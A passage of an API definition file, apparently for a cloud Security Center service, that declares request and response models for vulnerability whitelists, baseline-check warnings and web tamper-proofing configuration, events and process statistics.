*   cms: Web-CMS vulnerabilities
*   emg: urgent vulnerabilities', example='cve'),
    }
  ](name='TargetStats', description='An array that consists of the configurations of the vulnerability scan feature.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
}

model DescribeVulTargetStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulTargetStatisticsResponseBody(name='body'),
}

async function describeVulTargetStatistics(request: DescribeVulTargetStatisticsRequest): DescribeVulTargetStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVulTargetStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVulWhitelistRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 10.', example='10', position='Query'),
}

model DescribeVulWhitelistResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='74F97EF7-B543-43FD-A4E9-18456731F9C5'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  vulWhitelists?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:3263: curl security update'),
      id?: string(name='Id', description='The ID of the rule.', example='1275'),
      name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20173263'),
      reason?: string(name='Reason', description='The reason why the vulnerability is added to the whitelist.', example='ignore'),
      targetInfo?: string(name='TargetInfo', description='The application scope of the rule. The value is a JSON string that contains the following fields:

*   **type**: the type of the assets to which the rule is applied. Valid values:

    *   **Uuid**: server
    *   **GroupId**: server group

*   **groupIds**: the ID of the server group

*   **uuids**: the UUID of the server

> If this field is empty, the rule is applied to all assets.', example='{"type":"GroupId","groupIds":[916****],"uuids":[]}'),
      type?: string(name='Type', description='The type of the vulnerability.', example='cve'),
      whitelist?: string(name='Whitelist', description='The information about the vulnerability. The value of this parameter is in the JSON format. Valid values:

*   **name**: the name of the vulnerability
*   **type**: the type of the vulnerability.
*   **aliasName**: the alias of the vulnerability', example='[{
"name":"oval:com.redhat.rhsa:def:20173263",
"type":"cve",
"aliasName":"RHSA-2017:3263: curl security update"
}]'),
    }
  ](name='VulWhitelists', description='An array that consists of information about the whitelist of vulnerabilities.'),
}

model DescribeVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulWhitelistResponseBody(name='body'),
}

async function describeVulWhitelist(request: DescribeVulWhitelistRequest): DescribeVulWhitelistResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVulWhitelist', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWarningExportInfoRequest {
  exportId: long(name='ExportId', description='The ID of the export task.

>  You can can call the [ExportWarning](~~ExportWarning~~) operation to query the IDs of export tasks.', example='14356', position='Query'),
}

model DescribeWarningExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of baseline entries that are exported.', example='1'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task.

Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is successful.', example='success'),
  fileName?: string(name='FileName', description='The name of the exported Excel file.', example='app_20210917'),
  id?: long(name='Id', description='The ID of the export task for the baseline check result.', example='131231'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='https://eds.aliyun.com/notification/entitle/64b5c3e2-e52b-4d29-9617-e7e6d74XXXX'),
  message?: string(name='Message', description='The message that shows the task result. The value is fixed as **successful**, which indicates that the export task is complete.', example='successful'),
  progress?: int32(name='Progress', description='The progress percentage of the export task.', example='100'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  totalCount?: int32(name='TotalCount', description='The total number of baseline entries returned.', example='100'),
}

model DescribeWarningExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWarningExportInfoResponseBody(name='body'),
}

async function describeWarningExportInfo(request: DescribeWarningExportInfoRequest): DescribeWarningExportInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWarningExportInfo', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWarningMachinesRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c7e3c5b420a7947c2933303144688****', position='Query'),
  containerFieldName?: string(name='ContainerFieldName', description='The name of the field that is used to search for the container. Valid values:

*   **CONTAINER_ID**: the ID of the container
*   **IMAGE**: the name of the image
*   **NAMESPACE**: the namespace
*   **NODE_NAME**: the name of the node
*   **POD_IP**: the IP address of the pod
*   **HOST_IP**: the IP address of the host
*   **INSTANCE_ID**: the ID of the instance', example='containerId', position='Query'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the field that is used to search for the container.', example='c8bb3ef0f5ccf45508f0fd1ffc200****', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  groupId?: long(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](~~130972~~) operation to query the IDs of asset groups.', example='123', position='Query'),
  haveRisk?: int32(name='HaveRisk', description='Specifies whether risks were detected. Valid values:

*   **1**: yes
*   **0**: no', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  machineName?: string(name='MachineName', description='The name of the server on which the baseline check is performed.', example='oracle-win-001****', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **10**, which indicates that 10 entries of server information are displayed on each page. A maximum of 100 entries can be returned per page.', example='10', position='Query'),
  riskId: long(name='RiskId', description='The ID of the risk item.

> You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of risk items.', example='196', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='16', position='Query'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the UUID of the asset', example='uuid', position='Query'),
  uuids?: string(name='Uuids', description='The UUID of the server on which the baseline check is performed. Separate multiple UUIDs with commas (,).', example='9888955c-0076-49da-bd9c-34f5492b****', position='Query'),
}

model DescribeWarningMachinesResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6E4CBE87-E887-5AF1-86D2-78EB4AA3E771'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  warningMachines?: [ 
    {
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='7'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**
*   **false**', example='true'),
      containerId?: string(name='ContainerId', description='The container ID.', example='48a6d9a92435a13ad573372c3f3c63b7e04d106458141df9f92155709d******'),
      containerName?: string(name='ContainerName', description='The name of the container.', example='redis'),
      highWarningCount?: int32(name='HighWarningCount', description='The number of **high-risk** items on the server.', example='10'),
      instanceId?: string(name='InstanceId', description='The server ID.', example='i-m5ee8b9nr3h30mhb****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='oracle-win-00****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='1.2.XX.XX'),
      lowWarningCount?: int32(name='LowWarningCount', description='The number of **low-risk** items on the server.', example='3'),
      mediumWarningCount?: int32(name='MediumWarningCount', description='The number of **medium-risk** items on the server.', example='2'),
      passCount?: int32(name='PassCount', description='The number of the check items that passed the baseline check on the server.', example='10'),
      portOpen?: boolean(name='PortOpen', description='Indicates whether a port on the server is accessible over the Internet. Valid values:

*   **true**
*   **false**', example='true'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server is deployed.', example='cn-qingdao'),
      status?: int32(name='Status', description='The verification status of the risk item after the risk item is fixed. Valid values:

*   **1**: complete
*   **2**: verifying', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the server on which the baseline check is performed.', example='9888955c-0076-49da-bd9c-34f5492b****'),
    }
  ](name='WarningMachines', description='The information about the servers.'),
}

model DescribeWarningMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWarningMachinesResponseBody(name='body'),
}

async function describeWarningMachines(request: DescribeWarningMachinesRequest): DescribeWarningMachinesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWarningMachines', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWebLockBindListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20', position='Query'),
  remark?: string(name='Remark', description='The string that allows you to search for servers in fuzzy match mode. You can enter a server name or IP address.', example='192.168.XX.XX', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='116.30.XX.XX', position='Query'),
  status?: string(name='Status', description='The protection status of the server that you want to query. Valid values:

*   **on**: protected
*   **off**: unprotected', example='on', position='Query'),
}

model DescribeWebLockBindListResponseBody = {
  bindList?: [ 
    {
      auditCount?: string(name='AuditCount', description='The number of alerts.', example='2'),
      blockCount?: string(name='BlockCount', description='The number of blocked tampering events.', example='10'),
      dirCount?: string(name='DirCount', description='The number of protected directories.', example='5'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='testName'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='54.169.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      os?: string(name='Os', description='The operating system that the server runs.', example='Linux'),
      percent?: int32(name='Percent', description='The percentage of the starting progress of web tamper proofing. Valid values: 0 to 100.', example='99'),
      serviceCode?: string(name='ServiceCode', description='The error code for web tamper proofing. Valid values:

*   **2001**: The Security Center agent is offline.
*   **9999**: The connection timed out.', example='2001'),
      serviceDetail?: string(name='ServiceDetail', description='The exception details of web tamper proofing. Valid values:

*   **client offline**: The Security Center agent is offline.
*   **timeout**: The connection timed out.', example='client offline'),
      serviceStatus?: string(name='ServiceStatus', description='The status of web tamper proofing on the server. Valid values:

*   **stop**: Web tamper proofing is disabled.
*   **initializing**: Web tamper proofing is being enabled.
*   **exception**: Web tamper proofing is not running as expected.
*   **running**: Web tamper proofing is running.
*   **closing**: Web tamper proofing is being disabled.', example='stop'),
      status?: string(name='Status', description='The protection status of the server. Valid values:

*   **on**: The server is protected.
*   **off**: The server is not protected.', example='on'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='inet-12345****'),
    }
  ](name='BindList', description='The information about the servers that have web tamper proofing enabled.'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Pages start from page 1. Default value: 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 20.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
  totalCount?: int32(name='TotalCount', description='The total number of servers that have web tamper proofing enabled.', example='11409'),
}

model DescribeWebLockBindListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockBindListResponseBody(name='body'),
}

async function describeWebLockBindList(request: DescribeWebLockBindListRequest): DescribeWebLockBindListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWebLockBindList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWebLockConfigListRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.3.4', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server.', example='inet-1234567****', position='Query'),
}

model DescribeWebLockConfigListResponseBody = {
  configList?: [ 
    {
      defenceMode?: string(name='DefenceMode', description='The prevention mode. Valid values:

*   **block**: Interception Mode
*   **audit**: Alert Mode', example='audit'),
      dir?: string(name='Dir', description='The directory that has web tamper proofing enabled.', example='/www/tmp/'),
      exclusiveDir?: string(name='ExclusiveDir', description='The directory that has web tamper proofing disabled.

> If the value of **Mode** is **blacklist**, this parameter is returned.', example='/home/admin/tomcat'),
      exclusiveFile?: string(name='ExclusiveFile', description='The file that has web tamper proofing disabled.

> If the value of **Mode** is **blacklist**, this parameter is returned.', example='/home/admin/tomcat/localhost.log'),
      exclusiveFileType?: string(name='ExclusiveFileType', description='The type of the file that has web tamper proofing disabled.

> If the value of **Mode** is **blacklist**, this parameter is returned.', example='*.jpg'),
      id?: string(name='Id', description='The ID of the directory that has web tamper proofing enabled.', example='11'),
      inclusiveFile?: string(name='InclusiveFile', description='The file that has web tamper proofing enabled.

> If the value of **Mode** is **whitelist**, this parameter is returned.', example='/home/admin/tomcat/aaa.log'),
      inclusiveFileType?: string(name='InclusiveFileType', description='The type of the file that has web tamper proofing enabled.

> If the value of **Mode** is **whitelist**, this parameter is returned.', example='jpg'),
      localBackupDir?: string(name='LocalBackupDir', description='The local path to the backup files of the protected directory.', example='/usr/local/backup'),
      mode?: string(name='Mode', description='The protection mode of web tamper proofing. Valid values:

*   **whitelist**: In this mode, web tamper proofing is enabled for the specified directories and file types.
*   **blacklist**: In this mode, web tamper proofing is enabled for the unspecified subdirectories, file types, and files in the protected directory.', example='blacklist'),
      uuid?: string(name='Uuid', description='The UUID of the server that has web tamper proofing enabled.', example='80d2f7d6-31a9-4d7f-8ff4-7ecc42f8****'),
    }
  ](name='ConfigList', description='An array that consists of the configurations of web tamper proofing.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
  totalCount?: int32(name='TotalCount', description='The total number of directories that have web tamper proofing enabled on the server.', example='1'),
}

model DescribeWebLockConfigListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockConfigListResponseBody(name='body'),
}

async function describeWebLockConfigList(request: DescribeWebLockConfigListRequest): DescribeWebLockConfigListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWebLockConfigList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWebLockExclusiveFileTypeRequest {
}

model DescribeWebLockExclusiveFileTypeResponseBody = {
  exclusiveFileType?: [ string ](name='ExclusiveFileType'),
  requestId?: string(name='RequestId', example='9CCD7D51-5E81-5FF5-BD74-813DDD248430'),
  totalCount?: int32(name='TotalCount', example='30'),
}

model DescribeWebLockExclusiveFileTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockExclusiveFileTypeResponseBody(name='body'),
}

async function describeWebLockExclusiveFileType(request: DescribeWebLockExclusiveFileTypeRequest): DescribeWebLockExclusiveFileTypeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWebLockExclusiveFileType', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWebLockFileChangeStatisticsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.', example='20', position='Query'),
}

model DescribeWebLockFileChangeStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  list?: [ 
    {
      count?: int32(name='Count', description='The number of attempts.', example='33'),
      file?: string(name='File', description='The file path.', example='/tmp'),
    }
  ](name='List', description='An array consisting of the files that are changed.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='709A8C3D-A543-5B79-AB75-361B206F71D9'),
  totalCount?: int32(name='TotalCount', description='The total number of files that are attempted to change.', example='200'),
}

model DescribeWebLockFileChangeStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockFileChangeStatisticsResponseBody(name='body'),
}

async function describeWebLockFileChangeStatistics(request: DescribeWebLockFileChangeStatisticsRequest): DescribeWebLockFileChangeStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWebLockFileChangeStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWebLockFileEventsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  dealed?: string(name='Dealed', description='Specifies whether the event on web tamper proofing is handled. Valid values:

*   **n**: The event on web tamper proofing is handled.
*   **y**: The event on web tamper proofing is not handled.', example='n', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='20', position='Query'),
  processName?: string(name='ProcessName', description='The name of the process.', example='sys_create', position='Query'),
  remark?: string(name='Remark', description='The name of the asset.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the names of assets.', example='test-ecs', position='Query'),
  tsBegin?: long(name='TsBegin', description='The beginning of the time range to query. The value is a UNIX timestamp.', example='1660649981419', position='Query'),
  tsEnd?: long(name='TsEnd', description='The end of the time range to query. The value is a UNIX timestamp.', example='1660649981419', position='Query'),
}

model DescribeWebLockFileEventsResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='2'),
  list?: [ 
    {
      count?: long(name='Count', description='The number of attempts.', example='10'),
      ds?: long(name='Ds', description='The timestamp at which the event on web tamper proofing was first detected.', example='1657178400000'),
      eventName?: string(name='EventName', description='The name of the event on web tamper proofing.', example='modify'),
      eventStatus?: string(name='EventStatus', description='The status of the event on web tamper proofing. Valid values:

*   **1**: unhandled
*   **2**: ignored
*   **4**: deprecated
*   **8**: marked as false positive
*   **10**: added to the whitelist
*   **16**: handling
*   **32**: defended
*   **64**: invalid
*   **128**: deleted
*   **512**: automatically handled', example='1'),
      eventType?: string(name='EventType', description='The prevention mode. Valid values:

*   **audit**: Interception Mode
*   **web_lock**: Alert Mode', example='audit'),
      gmtEvent?: long(name='GmtEvent', description='The timestamp at which the event on web tamper proofing was last detected.', example='1657178400000'),
      id?: long(name='Id', description='The ID of the event on web tamper proofing.', example='3555953980'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the affected asset.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='172.25.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the asset.', example='8.210.XX.XX'),
      level?: string(name='Level', description='The severity of the event on web tamper proofing. Valid values: **medium**', example='medium'),
      path?: string(name='Path', description='The file path.', example='D:\\test-tamper-proofing\\123.html'),
      processName?: string(name='ProcessName', description='The name of the process.', example='python3.7'),
      processPath?: string(name='ProcessPath', description='The path to the process.', example='C:\\Windows\\explorer.exe'),
      status?: string(name='Status', description='The status of the event on web tamper proofing. Valid values:

*   **1**: unhandled
*   **2**: ignored
*   **4**: deprecated
*   **8**: marked as false positive
*   **10**: added to the whitelist
*   **16**: handling
*   **32**: defended
*   **64**: invalid
*   **128**: deleted
*   **512**: automatically handled', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='An array that consists of events on web tamper proofing returned.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  totalCount?: int32(name='TotalCount', description='The total number of events on web tamper proofing returned.', example='100'),
}

model DescribeWebLockFileEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockFileEventsResponseBody(name='body'),
}

async function describeWebLockFileEvents(request: DescribeWebLockFileEventsRequest): DescribeWebLockFileEventsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWebLockFileEvents', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWebLockFileTypeSummaryRequest {
}

model DescribeWebLockFileTypeSummaryResponseBody = {
  list?: [ 
    {
      count?: int32(name='Count', description='The number of attempts.', example='3'),
      type?: string(name='Type', description='The type of the protected file. Valid values:

*   **php**: PHP file
*   **jsp**: JSP file
*   **asp**: ASP file
*   **aspx**: ASPX file
*   **js**: JS file
*   **cgi**: CGI file
*   **html**: HTML file
*   **htm**: HTM file
*   **xml**: XML file
*   **shtml**: SHTML file
*   **shtm**: SHTM file
*   **jpg**: JPG file
*   **gif**: GIF file
*   **png**: PNG file', example='jsp'),
    }
  ](name='List', description='An array that consists of events on web tamper proofing returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4BB99533-4FDC-5B9C-A5E4-5AE3E9BE5C78'),
  totalCount?: int32(name='TotalCount', description='The total number of events on web tamper proofing.', example='639'),
}

model DescribeWebLockFileTypeSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockFileTypeSummaryResponseBody(name='body'),
}

async function describeWebLockFileTypeSummary(request: DescribeWebLockFileTypeSummaryRequest): DescribeWebLockFileTypeSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWebLockFileTypeSummary', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWebLockInclusiveFileTypeRequest {
}

model DescribeWebLockInclusiveFileTypeResponseBody = {
  inclusiveFileType?: [ string ](name='InclusiveFileType', description='An array that consists of the types of files that can be protected by web tamper proofing.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  totalCount?: int32(name='TotalCount', description='The total number of the types of files that can be protected by web tamper proofing.', example='15'),
}

model DescribeWebLockInclusiveFileTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockInclusiveFileTypeResponseBody(name='body'),
}

async function describeWebLockInclusiveFileType(request: DescribeWebLockInclusiveFileTypeRequest): DescribeWebLockInclusiveFileTypeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWebLockInclusiveFileType', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWebLockProcessBlockStatisticsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20', position='Query'),
}

model DescribeWebLockProcessBlockStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  list?: [ 
    {
      count?: int32(name='Count', description='The number of processes that are returned on the current page.', example='20'),
      process?: string(name='Process', description='The process.', example='cron'),
    }
  ](name='List', description='An array consisting of the statistics on processes.'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  totalCount?: int32(name='TotalCount', description='The total number of processes.', example='100'),
}

model DescribeWebLockProcessBlockStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockProcessBlockStatisticsResponseBody(name='body'),
}

async function describeWebLockProcessBlockStatistics(request: DescribeWebLockProcessBlockStatisticsRequest): DescribeWebLockProcessBlockStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWebLockProcessBlockStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWebLockProcessListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  processName?: string(name='ProcessName', description='The name of the process.', example='cron', position='Query'),
  status?: int32(name='Status', description='Specifies whether the process is added to the process whitelist. Valid values:

*   **1**: The process is added to the process whitelist.
*   **0**: The process is not added to the process whitelist.', example='0', position='Query'),
}

model DescribeWebLockProcessListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  list?: [ 
    {
      count?: string(name='Count', description='The number of entries returned on the current page.', example='33'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='test_ecs'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      processName?: string(name='ProcessName', description='The name of the process.', example='cron'),
      processPath?: string(name='ProcessPath', description='The path to the process.', example='/usr/sbin/cron'),
      status?: int32(name='Status', description='Indicates whether the process is added to the process whitelist. Valid values:

*   **1**: The process is added to the process whitelist.
*   **0**: The process is not added to the process whitelist.', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='An array that consists of details about the process.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  totalCount?: int32(name='TotalCount', description='The total number of processes.', example='200'),
}

model DescribeWebLockProcessListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockProcessListResponseBody(name='body'),
}

async function describeWebLockProcessList(request: DescribeWebLockProcessListRequest): DescribeWebLockProcessListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWebLockProcessList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWebLockStatusRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='221.214.XXX.XX', position='Query'),
}

model DescribeWebLockStatusResponseBody = {
  authCount?: int32(name='AuthCount', description='The total quota that you purchase for web tamper proofing.', example='32'),
  bindCount?: int32(name='BindCount', description='The associated tamper proofing quota.', example='2'),
  blockCount?: int32(name='BlockCount', description='The number of blocked processes.', example='48'),
  dirCount?: int32(name='DirCount', description='The number of protected directories.', example='2'),
  expireTime?: long(name='ExpireTime', description='The timestamp generated when the quota for tamper proofing expires. Unit: millisecond.', example='1688090851000'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  whiteCount?: int32(name='WhiteCount', description='The number of processes in the whitelist.', example='6'),
}

model DescribeWebLockStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockStatusResponseBody(name='body'),
}

async function describeWebLockStatus(request: DescribeWebLockStatusRequest): DescribeWebLockStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWebLockStatus', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWebLockTotalFileChangeCountRequest {
}

model DescribeWebLockTotalFileChangeCountResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E70074C8-DFB4-44C5-96C7-909DD231D68A'),
  totalCount?: long(name='TotalCount', description='The number of times that the files protected by web tamper proofing are changed.', example='200'),
}

model DescribeWebLockTotalFileChangeCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockTotalFileChangeCountResponseBody(name='body'),
}

async function describeWebLockTotalFileChangeCount(request: DescribeWebLockTotalFileChangeCountRequest): DescribeWebLockTotalFileChangeCountResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeWebLockTotalFileChangeCount', 'POST', '/', 'json', false, 'json', request);
}

model DescribeWebPathRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
  type?: string(name='Type', description='The type of the alert configuration. Valid values:

*   **web_path**', example='web_path', position='Query'),
}

model DescribeWebPathResponseBody = {
  configList?: [ 
    {
      targetList?: [ 
        {
          target?: string(name='Target', description='The object.', example='82048187-bb9b-4e19-8320-7b4ddb97****'),
